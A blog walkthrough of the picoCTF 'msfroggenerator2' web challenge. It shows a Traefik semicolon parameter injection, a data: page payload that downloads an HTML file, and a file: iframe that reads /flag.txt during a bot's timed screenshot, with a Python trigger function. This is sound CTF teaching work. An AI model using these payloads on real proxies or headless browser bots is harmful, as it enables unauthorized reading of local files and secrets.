---
layout: post
title: "Solving picoCTF msfroggenerator2"
description: "Walkthrough and solution for the picoCTF msfroggenerator2 web challenge involving parameter injection and local file reads."
date: 2026-08-03
categories: [ctf, picoctf, walkthrough, web]
image: https://miro.medium.com/v2/resize:fit:2000/format:webp/1*r_ujaGUOaHGwLD8Y5UUVUQ.png
permalink: /blog/solving-picoctf-msfroggenerator2/
locked: false
---

# Solving picoCTF `msfroggenerator2`

This was one of those challenges that looked simple at first and then kept adding layers. The site is a frog designer, but the interesting part is not the image editor. The real bug is in the way the report bot parses and visits a URL.

## Looking at the services

The challenge runs four services:

- OpenResty: the public-facing web server
- Traefik: an internal reverse proxy
- API: stores designs and screenshots
- Bot: opens the submitted URL in Chromium and sends back a screenshot

The important part of `bot.js` is roughly:

```js
await page.goto('http://openresty:8080/');
await page.evaluate(flag => {
    localStorage.setItem('flag', flag);
}, flag);

await page.goto(url);
await sleep(5000);

const screenshot = await page.screenshot({
    type: 'png',
    encoding: 'base64'
});

await page.evaluate(async screenshot => {
    await fetch('/api/reports/add', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${localStorage.getItem('flag')}`
        },
        body: JSON.stringify({ screenshot })
    });
}, screenshot);
```

The bot reads `/flag.txt`, places it in same-origin `localStorage`, visits our URL, waits five seconds, takes a screenshot, and submits it. The API does not let us add reports directly because it requires the flag in the `Authorization` header.

## Bypassing the URL restriction

The public endpoint is `/report?id=...`. OpenResty builds the bot URL like this:

```nginx
set_by_lua $url 'return "http://openresty:8080/?id=" .. ngx.var.arg_id';
proxy_pass "http://traefik:8080/?url=$url";
```

The bot service then parses its query string using:

```js
const { url } = Object.fromEntries(
    new URL(`http://${req.headers.host}${req.url}`).searchParams
);
```

`Object.fromEntries()` keeps the last value when a parameter appears more than once. So we want the bot to receive something like:

```text
?url=http://openresty:8080/?id=...&url=OUR_URL
```

The obvious `&` does not survive the first parsing step, and `%26` remains encoded inside the Lua variable. The useful detail is that the installed Traefik version normalizes semicolons into query separators. Therefore the request can use:

```text
/report?id=;url=OUR_URL
```

After the proxies process it, the bot sees our second `url` parameter and visits `OUR_URL`. This behavior is documented in [Traefik issue #9164](https://github.com/traefik/traefik/issues/9164).

## Why JavaScript URLs were not enough

At first, I tried sending a `javascript:` URL that would read `localStorage.flag` and submit a report. The semicolon bypass worked, but Puppeteer returned `ERR_ABORTED` for the JavaScript navigation before the payload executed reliably.

That was an important distinction: the proxy bypass was real, but `javascript:` navigation was not a dependable execution primitive in this Chromium/Puppeteer setup.

## Reading the local flag file

The bot runs as root and has the challenge flag mounted at:

```text
/flag.txt
```

Chrome will not let an HTTP or `data:` page freely read a local file. However, a local HTML file loaded with the `file:` scheme can place another local file in an iframe. That gives us a two-stage plan:

1. Use a `data:` page to download a controlled HTML file into Chrome's Downloads directory.
2. Open that file with `file:///root/Downloads/flagger.html`.
3. Let the file display `file:///flag.txt` in an iframe.
4. Around the five-second screenshot point, redirect back to `http://openresty:8080/api/get` so the bot's own code can submit the screenshot with its stored flag.

The download payload uses a Blob and a synthetic click:

```html
<body></body>
<script>
const blob = new Blob([atob("BASE64_READER_HTML")], {
    type: "text/html"
});

const link = document.createElement("a");
link.download = "flagger.html";
link.href = URL.createObjectURL(blob);
document.body.appendChild(link);
link.dispatchEvent(new MouseEvent("click", {
    bubbles: true,
    cancelable: true
}));
</script>
```

The downloaded reader is:

```html
<iframe src="file:///flag.txt"></iframe>
<script>
setTimeout(() => {
    const delay = 5000 + (Math.random() * 2 - 1) * 100;
    setTimeout(() => {
        document.location.href = "http://openresty:8080/api/get";
    }, delay);
});
</script>
```

The small random timing variation gives us several chances to catch the screenshot while the flag is visible but before the redirect has completely replaced the page.

One local-environment detail mattered: our bot image did not initially have `/root/Downloads`, so we created that directory inside the disposable container. Also, `data:text/html,` worked reliably in our Chromium build; the similar-looking `data:html/text,` form did not execute the download script.

## Exploit script

The finished script is in [`download_exploit.py`](D:/labs/msfroggenerator2/download_exploit.py). To use it against an equivalent instance, change only `BASE`:

```python
BASE = "http://TARGET_HOST:PORT"
```

The important trigger function is:

```python
def trigger(target: str) -> str:
    target_id = ";url=" + urllib.parse.quote(target, safe="")
    request_url = f"{BASE}/report?id={target_id}"
    with urllib.request.urlopen(request_url, timeout=10) as response:
        return response.read().decode("utf-8", errors="replace")
```

The script sends the download stage first, waits for the bot to finish, and then sends the `file:` stage several times. It retrieves `/api/reports/get`, decodes each screenshot, and saves the PNGs locally.

## Result

In the local container, the exploit generated new authorized reports and one screenshot visibly contained:

```text
picoCTF{test_flag}
```

The later attempts captured the empty JSON response from `/api/get`, which is expected. The timing race is the final part of the challenge.

![PoC 1](https://miro.medium.com/v2/resize:fit:720/format:webp/1*Mp7WW-2SxDHFg1jKrbAEqg.png)

![PoC 2](https://miro.medium.com/v2/resize:fit:720/format:webp/1*Fsnmd-ivLdxRHkv6GIVPrg.png)

## Main lessons

- Always inspect every parser boundary, especially when a value is parsed by multiple services.
- Duplicate query parameters can behave differently between parsers.
- A reverse proxy normalization quirk can turn a restricted URL into an arbitrary one.
- Browser security boundaries depend heavily on the URL scheme.
- When a bot takes a screenshot after a fixed delay, timing can be part of the exploit.
